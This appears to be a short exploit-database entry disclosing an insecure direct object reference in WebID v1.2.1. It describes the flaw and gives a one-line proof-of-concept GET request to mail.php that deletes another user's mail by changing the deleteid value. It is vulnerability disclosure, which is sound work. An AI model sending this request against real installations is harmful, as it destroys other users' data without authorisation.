# Exploit Title: Webid v1.2.1 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://sourceforge.net/projects/simpleauction/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Webid
## Version: v1.2.1
## Exploit Description:
## Webid v1.2.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to delete mail that is owned by other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /mail.php?deleteid[]=1(CHANGE HERE) HTTP/1.1
```